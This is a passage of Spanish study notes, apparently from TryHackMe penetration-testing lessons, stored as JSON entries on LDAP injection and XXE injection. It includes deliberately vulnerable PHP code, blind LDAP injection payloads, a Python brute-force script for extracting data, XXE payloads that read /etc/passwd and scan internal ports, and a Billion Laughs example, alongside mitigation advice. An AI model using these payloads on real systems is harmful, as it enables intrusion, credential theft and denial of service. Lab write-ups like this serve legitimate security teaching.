credentials\");\n}\n\n$filter = \"(&(uid=$username)(userPassword=$password))\";\n$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);\n\nif ($search_result) {\n   $entries = ldap_get_entries($ldap_conn, $search_result);\n    if ($entries['count'] > 0) {\n        foreach ($entries as $entry) {\n            if (is_array($entry)) {\n                if (isset($entry['cn'][0])) {\n                    if($entry['uid'][0] === $_POST['username']){\n                        $message = \"Welcome, \" . $entry['cn'][0] . \"!\\n\";\n                    }else{\n                        $message = \"Something is wrong in your password.\\n\";\n                    }\n                }\n            }\n        }\n    } else {\n        $error = true;\n    }\n} else {\n    echo \"LDAP search failed\\n\";\n}\n\nldap_close($ldap_conn);\n```\n\nEste c√≥digo es vulnerable a blind LDAPi porque el filtro LDAP es constru√≠do sin sanitizar el input del usuario. Sin embargo, s√≥lo ofrece feedback gen√©rico haci√©ndolo dif√≠cil de explotar directamente.\n\nPara expplotar esta vulnerabilidad se puede usar una t√©cnica conocida como Boolean-Based Blind LDAPi. El atacante inyecta condiciones en el username para hacer la query LDAP true o false observando el comportamiento de la aplicaci√≥n para inferir informaci√≥n.\n\nPor ejemplo, un atacante puede probar a inyectar un username como `a*)(|(&`, el cual al incluirse en la query LDAP comprueba cualquier usuario con `a` en su uid:\n\n<h4>Injected Username and Password</h4>\n```bash\nusername=a*%29%28%7C%28%26&password=pwd%29\n```\n\n>[!NOTE] El payload de arriba es la versi√≥n URL-encodeada de `a*)(|(&` para el username y `pwd)` para la contrase√±a.\n\n![[Pasted image 20260115113420.png]]\n\n<h4>Query LDAP Resultante</h4>\n```bash\n(&(uid=a*)(|(&)(userPassword=pwd))) \n```\n\n![[Pasted image 20260115113441.png]]\n\nSi la aplicaci√≥n devuelve \"Something is wrong with your password\", el atacante puede inferir que un usuario con una cuenta que empieza por `a` en su uid existe en el directorio LDAP. Para comprobar el siguiente caracter reiteramos el proceso.\n\n<h4>Injected Username and Password</h4>\n```php\nusername=ab*%29%28%7C%28%26&password=pwd%29\n```\n\n![[Pasted image 20260115113617.png]]\n\n<h4>Query LDAP Resultante</h4>\n```php\n(&(uid=ab*)(|(&)(userPassword=pwd))) \n```\n\n![[Pasted image 20260115113639.png]]\n\nEsto indica que el siguiente caracter no es \"b\". Un atacante puede automatizar este tipo de comprobaci√≥n adivinando caracteres del email iterativamente, observando el comportamiento de la aplicaci√≥n en respuesta al input crafteado, similar a la Boolean-Based SQLi.\n\n----------------------------------------------\n<h2>T√©cnicas para Extraer Informaci√≥n</h2>\n1. **Explotaci√≥n Booleana:** Esto involucra inyectar condiciones que son evaluadas en true o false y observar el comportamiento de la aplicaci√≥n.\n2. **Inferencia Basada en Errores:** En algunos casos inyecciones espec√≠ficas pueden disparar mensajes de eeror peculiares ofreciendo pistas sobre la estructura LDAP.",
    "modified": "2026-01-16T00:55:48"
  },
  {
    "title": "7. Automating the Exploitation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/5-ldap-injection/7-automating-the-exploitation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/5. LDAP Injection/7. Automating the Exploitation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 5. LDAP Injection",
    "content": "<h2>Exploit Code</h2>\nPara automatizar la exfiltraci√≥n de infrmaci√≥n de la tarea anterior puedes usar el c√≥digo de Python siguiente:\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport string\nimport time\n\n# Base URL\nurl = 'TARGET_URL' #¬°¬°¬°SUSTITUIR!!!\n\n# Define the character set\nchar_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + \"._!@#$%^&*()\"\n\n# Initialize variables\nsuccessful_response_found = True\nsuccessful_chars = ''\n\nheaders = {\n    'Content-Type': 'application/x-www-form-urlencoded'\n}\n\nwhile successful_response_found:\n    successful_response_found = False\n\n    for char in char_set:\n        #print(f\"Trying password character: {char}\")\n\n        # Adjust data to target the password field\n        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}\n\n        # Send POST request with headers\n        response = requests.post(url, data=data, headers=headers)\n\n        # Parse HTML content\n        soup = BeautifulSoup(response.content, 'html.parser')\n\n        # Adjust success criteria as needed\n        paragraphs = soup.find_all('p', style='color: green;')\n\n        if paragraphs:\n            successful_response_found = True\n            successful_chars += char\n            print(f\"Successful character found: {char}\")\n            break\n\n    if not successful_response_found:\n        print(\"No successful character found in this iteration.\")\n\nprint(f\"Final successful payload: {successful_chars}\")\n```\n\n<h4>Desglose del C√≥digo</h4>\n1. **Imports:** \n\t- `requests`: Librer√≠a de Python para hacer peticiones HTTP.\n\t- `BeautifulSoup` from `bs4`: Una librer√≠a para parsear documentos HTML, haciendo m√°s f√°cil navegar y buscar el √°rbol parseado.\n\t- `string`: M√≥dulo que coniene operaciones de string comunes incluyendo una colecc√≥n de constantes de strings.\n\t- `time`: Un m√≥dulo que ofrece varias funciones relacionadas con el tiempo.\n2. **Setup:** \n\t- La variable `url` est√° configurada en `TARGET_URL` y hay que sustitu√≠rla por la URL objetivo donde se mandar√°n las peticiones POST.\n\t- `char_set` incluye letras min√∫sculas y may√∫sculas, n√∫meros y un conjunto de caractees especiales.\n3. **Inicializaci√≥n de Variables:** \n\t- `successful_response_found`: Es una flag usada para controlar el bucle while. Comienza como `True` para entrar al loop y lo configura a `False` cuando no encuentra un caracter.\n\t- `successful_chars`: Guarda la secuencia de los caracteres correctamente adivinados.\n4. **Headers HTTP:** \n\t- Se define un diccionario `headers` con el content type configurado en `'application/x-www-form-urlencoded'`, indicando el formato del cuerpo de la petici√≥n HTTP POST.\n5. **Bucle  Principal:** \n\t- El script entra en un bucle `while` que contin√∫a tanto como `successful_response_found` sea `True`.\n\t- Dentro de este loop, itera cada caracter en `char_set`.\n6. **Construir y Mandar Peticiones HTTP:** \n\t- Para cada caracter el script crea un diccionario `data` con un par de clave-valor para la petici√≥n HTTP POST. El campo `username` es inyectado con un payload combinando caracteres encontrados y el caracter en comprobaci√≥n actualmente, seguido de `*)(|(&` que es parte de la sintaxis de inyecci√≥n. El campo de contrase√±a es configurado en `pwd)`.\n\t- Se manda una petici√≥n HTTP POST a la `url` objetivo con la `data` y `headers` constru√≠dos.\n7. **Manejo de Respuestas:** \n\t- El contenido de la respuesta es parseado con BeautifulSoup para analizar la estructura HTML.\n\t- El script busca etiquetas `<p>` con el atributo `style` configurado como `'color: green;'`, que es una adivinaci√≥n exitosa.\n8. **Verificaci√≥n de Caracteres:** \n\t- Si se encuentran dichos p√°rrafos, quiere decir que el caracter actual es parte de la contrase√±a. Este caracter es a√±adido a `successful_chars` y el script sale del bucle interno para volver a empezar.\n\t- Si no se encuentran p√°rrafos que coincidan con el criterio, el script concluye que no ha habido hallazgos y sale del bucle principal.\n9. **Output:** \n\t- Una vez que todos los caracteres se han probado o se encuentra la sentencia correcta, el script imprime la secuencia final de caracteres encontrados.\n\nEl script adivina de forma iterativa los caracteres del email observando el comportamiento de la p√°gina. Cuando consigas el email haz una wildcard injection en la contrase√±a.",
    "modified": "2026-01-16T00:55:48"
  },
  {
    "title": "6. SSRF and XXE",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/6-ssrf-and-xxe/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/6. SSRF and XXE.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "Los ataques SSRF (Server-Side Request Forgery) ocurren cuando un atacante abusa una funcionalidad en el servidor causando que este haga peticiones a una localizaci√≥n que no pretend√≠a originalmente. En el contexto de XXE, un atacante puede manipular el input XML para hacer que el servidor haga peticiones a un servicio o archivo interno. Esta t√©cnica se puede usar tanto para escanear redes internas, acceder a endpoints restringidos o interactuar con los servicios que s√≥lo son accesibles desde la red local del servidor.\n\n-------------------------------------------------\n<h2>Escaneo de Red Interna</h2>\nConsidera un escenario donde un servidor vulnerable alberga una aplicaci√≥n web internamente en un puerto no est√°ndar. Un atacante puede explotar una vulnerabilidad XXE que hace que el servidor mande una petici√≥n a su propio recurso de red interna.\n\nPor ejemplo, usando la petici√≥n capturada de la in-band XXE, m√°ndala al intruder y usa el payload de abajo:\n\n```xml\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"http://localhost:¬ß10¬ß/\" >\n]>\n<contact>\n  <name>&xxe;</name>\n  <email>test@test.com</email>\n  <message>test</message>\n</contact>\n```\n\nLa entidad externa est√° configurada para recopilar informaci√≥n de `http://localhost:¬ß10¬ß/`. El intruder reiterar√° la petici√≥n y buscar√° servicios internos corriendo en el servidor.\n\n<h4>Pasos para aplicar fuerza bruta en busca de puertos abiertos:</h4>\n1. Una vez que la petici√≥n capturada de la in-band XXE est√© en el intruder, haz click en el bot√≥n `Add¬†¬ß` mientras subrayas el puerto.\n   ![[Pasted image 20260112141608.png]]\n2. En la pesta√±a `Payloads`, configura el tipo de payload a `Numbers` de `1-65535`.\n   ![[Pasted image 20260112141649.png]]\n3. Una vez hecho, haz click en el bot√≥n de comenzar el ataque y haz click en la columna de `Length` para ordenar los √≠tems de mayor a menor. La diferencia en la respuesta del servidor indicar√° que requiere investigaci√≥n ya que puede contener informaci√≥n diferente a la mayor√≠a de peticiones.\n   ![[Pasted image 20260112141820.png]]\n   ![[Pasted image 20260112141827.png]]\n\n<h4>C√≥mo procesa esto el Servidor:</h4>\nLa entidad `&xxe;` se rederencia dentro del tag `<name>`, provocando que el servidor haga una petici√≥n HTTP a la URL especificada cuando se parsea el XML. La respuesta del recurso pedido ser√° incluida en la respuesta del servidor. Si la aplicaci√≥n contiene claves secretas, claves de API o contrase√±as hardcodeadas, esta informaci√≥n podr√° ser usada como otra forma de ataque como reutilizaci√≥n de contrase√±a.\n\n-----------------------------------------\n<h2>Implicaciones Potenciales de Seguridad</h2>\n- **Reconocimiento:** Los atacantes pueden descubrir puertos de red internos y ganar acceso a la arquitectura interna del servidor.\n- **Filtrado de Informaci√≥n:** Si el servicio interno devuelve informaci√≥n sensible, podr√≠a ser expuesta a trav√©s de errores o output XML.\n- **Elevaci√≥n de Privilegios:** Acceder a servicios internos podr√≠a conllevar a exploits m√°s avanzados escalando las capacidades de un atacante en la red.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "4. Exploiting XXE - In-Band",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/4-exploiting-xxe-in-band/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/4. Exploiting XXE - In-Band.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>In-Band vs Out-of-Band XXE</h2>\nLa XXE in-band se refiere a una vulnerabilidad XXE donde el atacante puede ver la respuesta del servidor. Esto permite una exfiltraci√≥n de informaci√≥n y explotaci√≥n directas. El atacante puede mandar un payload XML malicioso a la aplicaci√≥n y el servidor responder√° con la informaci√≥n extra√≠da o el resultado del ataque.\n\nLa XXE out-of-band se refiere a la vulnerabilidad XXE donde el atacante no puede ver la respuesta del servidor. Esto requiere usar canales alternaticos como peticiones DNS o HTTP para exfiltrar datos. Para extraer la informaci√≥n, el atacante toene que configurar un payload XML malicioso que dispare una petici√≥n OOB para XXE.\n\n-------------------------------------------\n<h2>In-Band XXE Exploitation</h2>\nUsaremos Burp para este temoa. Para demostrar esta vulnerabilidad vamos a `http://IP/contact.php` y rellenamos el formulario.\n\n![[Pasted image 20260112115739.png]]\n\nLe damos al bot√≥n de subir e interceptamos la petici√≥n.\n\n![[Pasted image 20260112115804.png]]\n\nLa informaci√≥n subida es procesada por `contact_submit.php` el cual contiene un c√≥digo PHP vulnerable dise√±ado para devolver el valor del par√°metro \"name\" cuando un usuario sube un mensaje en el formulario. Debajo est√° el c√≥digo vulnerable:\n\n```php\nlibxml_disable_entity_loader(false);\n\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $xmlData = file_get_contents('php://input');\n\n    $doc = new DOMDocument();\n    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); \n\n    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;\n\n    echo \"Thank you, \" .$expandedContent . \"! Your message has been received.\";\n}\n```\n\nYa que la aplicaci√≥n devuelve el valor del par√°metro \"name\", podemos inyectar una entidad que apunte a `/etc/passwd` para divulgar varios de sus valores.\n\n```xml\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<contact>\n<name>&xxe;</name>\n<email>test@test.com</email>\n<message>test</message>\n</contact>\n```\n\nUsando el payload de arriba, reemplazamos el XML inicial subido a `contact_submit.php` y reenviamos la petici√≥n.\n\n![[Pasted image 20260112120122.png]]\n\n----------------------------------------------------------\n<h2>XML Entity Expansion</h2>\nLa expansi√≥n de entidaddes XML es una t√©cnica usada en los ataques XXE que involucra definir entidades en un documento XML el cual expande despu√©s el parser. Los atacante pueden abusar de esta funcionalidad creando entidades recursivas o excesivamente largas, llevando a Denial of Service (DoS) o definiendo entidades externas referenciando archivos o servicio  sensibles. Este m√©todo es central a ambos in-band y out-of-band XXE, ya que permite a los atacntes inyectar entidades maliciosas en el XML. Por ejemplo:\n\n```xml\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe \"This is a test message\" >]>\n<contact><name>&xxe; &xxe;\n</name><email>test@test.com</email><message>test</message></contact>\n```\n\nEn el payload de arriba, `&xxe;` es expandido donde aparece. Los atacantes usan esta expansi√≥n para realizar un ataque \"Billion Laughs\", donde un peque√±o documento XML se expande recursivamente para consumir recursos del servidor, llevando a un denial of servide.\n\n![[Pasted image 20260112121515.png]]",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "La inyecci√≥n XXE (XML External Entity), es un tipo de debilidad de seguridad que explota las vulnerabilidades del input de una aplicaci√≥n XML. Ocurre cuando la app acepta input XML que incluye referencias a entidades externas en el propio XML. Los atacantes puede usar esta vulnerabilidad para divulgar archivos locales, hacer peticiones del lado del servidor o ejecutar c√≥digo remoto.\n\nDado el amplio uso de XML en las aplicaciones web, particularmente en APIs basadas en SOAP, no podemos subestimar esta vulnerabilidad.\n\n----------------------------------\n<h2>Objetivos</h2>\n1. Reconocer conceptos y peligros fundamentales asociados con la inyecci√≥n XXE.\n2. Identificar XML vulnerable procesando configuraciones y pr√°cticas.\n3. Desarrollar t√©cnicas para detectar, explotar y mitigar vulnerabilidades XXE en aplicaciones.\n\n-------------------------------------\n<h2>Pre-requisitos</h2>\n1. Conocimiento de c√≥mo se estructuran los documentos XML, incluyendo etiquetas, atributos y referencias a entidades.\n2. Familiaridad con c√≥mo las aplicaciones web procesan el input y manejan la informaci√≥n.\n3. Conocimiento b√°sico de OWASP ZAP o Burp Suite.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "7. Mitigation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/7-mitigation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/7. Mitigation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>Evadir las Malas Configuraciones</h2>\nLas malas configuraciones en el parser de XML son una causa com√∫n de vulnerabilidades relacionadas con la XXE. Ajustar estas configuraciones puede reducir significativamente el riesgo de ataques XXE. Debajo se detallan algunas gu√≠as y buenas pr√°cticas.\n\n---------------------------------------\n<h2>Buenas Pr√°cticas en General</h2>\n1. **Deshabilitar Entidades Externas y DTDs:** Como la mejor pr√°ctica, deshabilitar el procesado de entidades eternas y DTDs en tu parser XML.\n2. **Usar Formatos de Datos menos Complejos:** Donde sea posible considera usar formatos de datos m√°s simples como JSON.\n3. **Validar el Input:** Valida y sanitiza absolutamente todo el input proveniente del usuario.\n\n--------------------------------------------\n<h2>T√©cnicas de Mitigaci√≥n en Lenguajes Populares</h2>\n<h4>Java</h4>\nUsa `DocumentBuilderFactory` y deshabilita los DTDs:\n\n```java\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\ndbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\ndbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\ndbf.setXIncludeAware(false);\ndbf.setExpandEntityReferences(false);\nDocumentBuilder db = dbf.newDocumentBuilder();\n```\n<h4>.NET</h4>\nConfigura los lectores XML para que ignoren los DTDs y las entidades externas:\n\n```csharp\nXmlReaderSettings settings = new XmlReaderSettings();\nsettings.DtdProcessing = DtdProcessing.Prohibit;\nsettings.XmlResolver = null;\nXmlReader reader = XmlReader.Create(stream, settings);\n```\n<h4>PHP</h4>\nDeshabilita las entidades externas que cargan por libxml:\n\n```php\nlibxml_disable_entity_loader(true);\n```\n<h4>Python</h4>\nUsa la librer√≠a `defusedxml` la cual est√° dise√±ada para mitigar las vulnerabilidades XML:\n\n```python\nfrom defusedxml.ElementTree import parse\net = parse(xml_input)\n```\n\n-----------------------------------------\n<h2>Actualizaci√≥n y Parcheo Regular</h2>\n- **Actualizaci√≥n de Software:** Mant√©n todos los procesadores y librer√≠as XML actualizados. \n- **Parches de Seguridad:** Aplica parches de seguridad de forma regular a las aplicaciones y sus entornos.\n\n-------------------------------------------\n<h2>Conciencia de Seguridad y Revisi√≥n de C√≥digo</h2>\n- **Realiza Revisiones de c√≥digo:** Revisa el c√≥digo regularmente en busca de vulnerabilidades, especialmente c√≥digo que maneja XML.\n- **Promueve el Entrenamiento de Seguridad:** Aseg√∫rate de que los desarrolladores est√°n concienciados de las pr√°cticas de programaci√≥n segura, incluyendo los riesgos asociados al parseo de XML.",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "2. Exploring XML",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/2-exploring-xml/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/2. Exploring XML.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>¬øQu√© es XML?</h2>\nXML (Extensible Markup Language) es un lenguaje de marcas derivado de SGML (Standard Generalized Markup Language), el cual es el mismo est√°ndar en el que est√° basado HTML. XML es usado t√≠picamente por aplicaciones para guardar y transportar informaci√≥n en un formato que sea legible para los humanos y parseable para las m√°quinas. Es flexible y ampliamente usado para intercambiar informaci√≥n entre diferentes sistemas y aplicaciones. XML consta de elementos, atributos e informaci√≥n, que son usados para representar informaci√≥n de forma estructurada.\n\n---------------------------------------------\n<h2>Sintaxis y Estructura de XML</h2>\nLos elementos XML se representan con etiquetas, que se rodean por los s√≠mbolos `<` y `>`. Las etiquetas suelen venir en pares, con la apertura precediendo al contenido y la cola al final. Por ejemplo:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<user id=\"1\">\n   <name>John</name>\n   <age>30</age>\n   <address>\n      <street>123 Main St</street>\n      <city>Anytown</city>\n   </address>\n</user>\n```\n\nEl tag `<name>John</name>` representa un elemento llamado \"name\" con el contenido \"John\". Los atributos ofrecen informaci√≥n adicional sobre los elementos y se especifican en el tag de apertura. El tag `<user id='1'>` especifica un atributo \"id\" con valor \"1\" para el elemento \"user\". La informaci√≥n de caracteres se refiere al contenido como \"John\".\n\nEl ejemplo de arriba muestra un XML con elementos, atributos e informaci√≥n de caracteres. La declaraci√≥n del tag `<?xml version=\"1.0\" encoding=\"UTF-8\"?>` indica la versi√≥n XML y el elemento contiene varios subelementos y atributos que representan la informaci√≥n del usuario.\n\n----------------------------------\n<h2>Casos de Uso Comunes en Aplicaciones Web</h2>\nEs ampliamente usado en las aplicaciones web para intercambiar informacii√≥n, almacenamiento y configuraci√≥n. Se usa com√∫nmente en servicios web y APIs, como SOAP y REST, para intercambiar informaci√≥n entre sistemas. XML tambi√©n se usa para los archivos de configuraci√≥n como la de los servidores web o aplicaciones.\n\n------------------------------------------\n<h2>¬øQu√© es XSLT?</h2>\nXSLT (Extensible Stylesheet Language Transformations) es un lenguaje usado para transformar y formatear documentos XML. Mientras que XSLT es principalmente usado para transformar informaci√≥n y formateo, tambi√©n es relevante para los ataques XXE.\n\nXLST puede ser usado para facilitar los ataques XXE de varias maneras:\n\n1. **Extracci√≥n de Informaci√≥n:** XSLT puede ser usado para extraer informaci√≥n sensible de un documento XML, lo que puede ser usado en un ataque XXE, como por ejemplo credenciales de usuario.\n2. **Expansi√≥n de Entidad:** XSLT puede expandir entidades definidas en un documento XML, incluyendo entidades externas. Esto puede permitir que un atacante inyecte entidades maliciosas llevando a una vulnerabilidad XXE.\n3. **Manipulaci√≥n de Informaci√≥n:** XSLT puede manipular la informaci√≥n en un documento XML, potencialmente permitiendo que un atacante pueda inyectar o modificar informaci√≥n existente para explotar una vulnerabilidad XXE.\n4. **XXE a Ciegas:** XSLT puede ser usado para realizar ataques XXE a ciegas, en los que el atacante inyecta entidades maliciosas sin ver la respuesta del servidor.\n\n--------------------------------\n<h2>¬øQu√© son los DTDs?</h2>\nDTDs o Document Type Definitions definen la estructura y restricciones de un documento XML. Especifican los elementos permitidos, atributos y relaciones entre ellos. Los DTDs pueden ser internoes en el documento XML o externos en un archivo separado.\n\nEl prop√≥sito de usar DTDs es:\n\n- **Validaci√≥n:** Los DTDs validan la estructura de un XML para asegurar que encaja con los criterios especificados antes de procesarlo, lo que es crucial en entornos donde la integridad es clave.\n- **Declaraci√≥n de Entidades:** Los DTDs definen entidades que pueden usarse a trav√©s del documento CML incluyendo las entidades externas que son clave en ataques XXE.\n\nLos DTDs internos se especifican usando la declaraci√≥n `<!DOCTYPE`, mientras que los DTDs externos se referencian usando la palabra clave \"SYSTEM\".\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE config [\n<!ELEMENT config (database)>\n<!ELEMENT database (username, password)>\n<!ELEMENT username (#PCDATA)>\n<!ELEMENT password (#PCDATA)>\n]>\n<config>\n<!-- configuration data -->\n</config>\n```\n\nEl ejemplo muestra un DTD interno definiendo la estructura de un archivo de configuraci√≥n. Las declaraciones `<!ELEMENT` especifican los elementos permitids y sus relaciones.\n\n----------------------------------\n<h2>DTDs y XXE</h2>\nLos DTDs juegan un rol crucial en la inyecci√≥n XXE, ya que pueden usarse para declarar entidades externas. Las entidades externas pueden referenciar los archivos externos o URLs, las cuales pueden llevar a informaci√≥n maliciosa o inyecci√≥n de c√≥digo.\n\n--------------------------------------------\n<h2>Entidades XML</h2>\nLas entidades XML son placeholders de informaci√≥n o c√≥digo que puede ser expandido en un documento XML. Hay 5 tipos de entidades: Internas, externas, param√©tricas, generales y de caracteres.\n\nEjemplo de entidad externa:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY external SYSTEM \"http://example.com/test.dtd\">\n<config>\n&external;\n</config>\n```\n\nEsto muestra una entidad externa referenciando una URL. La referencia `&external;` en el documento XML ser√° expandida a los contenidos de la URL referenciada.\n\n--------------------------------------\n<h2>Tipos de Entidades</h2>\n1. Las entidades internas son esencialemente variables usadas en un documento SML para definir y sustituir contenido que puede haber sido repetido m√∫ltiples veces. Se definen en los DTDs y pueden simplificar el manejo de informaci√≥n repetitiva. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY inf \"This is a test.\">\n]>\n<note>\n        <info>&inf;</info>\n</note>\n```\n   \n   En este ejemplo la entidad `&inf;` es reemplazada por su valor all√° donde aparezca en el documento.\n\n2. Las entidades externas son similares a las internas, pero sus contenidos est√°n referenciados desde fuera del documento XML como desde un archivo o URL separada. Esta funcionalidad puede ser explotada en ataques XXE (XML External Entity) si el procesador est√° configurado para resolver entidades externas. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY ext SYSTEM \"http://example.com/external.dtd\">\n]>\n<note>\n        <info>&ext;</info>\n</note>\n```\n   \n   Aqu√≠, `&ext;` coge contenido de la URL especificada, lo que podr√≠a ser un riesgo de seguridad si la URL estuviese controlada por el atacante.\n\n3. Las entidades param√©tricas son un tipo de entidad especial usado en los DTDs para definir estructuras reutilizables o incluir subconjunts DTD externos. Son particularmente √∫til oara modular los DTDs y para mantener aplicaciones XML a gran escala. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY % common \"CDATA\">\n<!ELEMENT name (%common;)>\n]>\n<note>\n        <name>John Doe</name>\n</note>\n```\n   \n   En este caso `%common;` se usa en el DTD para definir el tipo de dinformaci√≥n que el elemento `name` deber√≠a contener.\n\n4. Las entidades generales son similares a las variables y pueden ser declaradas internamente o externamente. Son usadas para definir sustituciones que pueden usarde en el cuerpo del documento XML. Al contrario que las entidades param√©tricas, las generales se usan en el contenido del documento. Por ejemplo:\n   \n```xml\n<!DOCTYPE note [\n<!ENTITY author \"John Doe\">\n]>\n<note>\n        <writer>&author;</writer>\n</note>\n```\n   \n   La entidad `&author;` es una entidad general usada para sustituir el nombre del autor donde se referencia en el documento.\n\n5. Las entidades de caracteres se usan para representar caracteres especiales o reversos que no pueden ser usados directamente en documentos XML. Estas entidades previenen que el parser malinterprete la sintaxis. Por ejemplo:\n   \n   - `&lt;` para menor que `<`.\n   - `&gt;` para mayor que `>`.\n   - `&amp;` para el ampersand `&`.\n   \n```xml\n<note>\n        <text>Use &lt; to represent a less-than symbol.</text>\n</note>\n```\n   \n   Este uso asegura que los caracteres especiales se procesen por el parser XML sin romper la estructura del documento.\n\nLa imagen de abajo muestra los tipos de entidades en una estructura DOM:\n\n![[Pasted image 20260112113141.png]]",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "0. XXE Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/0-xxe-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/0. XXE Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/1. Introduction]]\n[[2. Exploring XML]]\n[[3. XML Parsing Mechanisms]]\n[[4. Exploiting XXE - In-Band]]\n[[5. Exploiting XXE - Out-of-Band]]\n[[6. SSRF and XXE]]\n[[7. Mitigation]]",
    "modified": "2026-01-13T00:51:00"
  },
  {
    "title": "5. Exploiting XXE - Out-of-Band",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/3-xxe-injection/5-exploiting-xxe-out-of-band/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/3. XXE Injection/5. Exploiting XXE - Out-of-Band.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 3. XXE Injection",
    "content": "<h2>Out-Of-Band XXE</h2>\nPor otro lado, para demostrar esta vulnerabilidad vamos a ir a `http://IP/index.php`. La aplicaci√≥n usa el c√≥digo de abajo cuando un usuario sube un archivo.\n\n```php\nlibxml_disable_entity_loader(false);\n$xmlData = file_get_contents('php://input'); \n\n$doc = new DOMDocument();\n$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);\n\n$links = $doc->getElementsByTagName('file');\n\nforeach ($links as $link) {\n    $fileLink = $link->nodeValue;\n    $stmt = $conn->prepare(\"INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())\");\n    $stmt->bind_param(\"s\", $fileLink);\n    $stmt->execute();\n    \n    if ($stmt->affected_rows > 0) {\n        echo \"Link saved successfully.\";\n    } else {\n        echo \"Error saving link.\";\n    }\n    \n    $stmt->close();\n}\n```\n\nEl c√≥digo de arriba no devuelve los valores de la informaci√≥n XML subida. Es por esto que usamos el t√©rmino OOB, ya que la informaci√≥n exfiltrada tiene que ser capturada usando un sservidor controlado por el atacante.\n\nPara este ataque, necesitaremos un servidor que recibir√° la informaci√≥n de otros servidores. Podemos usar el m√≥dulo `http.server` de Python aunque hay opciones como Apache o Nginx. Arranca un servidor de python usando el comando `python3 -m http.server PUERTO`.\n\nSube un archivo a la aplicaci√≥n y monitoriza la petici√≥n que es mandada a `submit.php` usando Burp. Redirige la petici√≥n  al repetidor.\n\n![[Pasted image 20260112124531.png]]\n\nUsando el payload de abajo, reemplaza el valor del archivo XML en la petici√≥n y 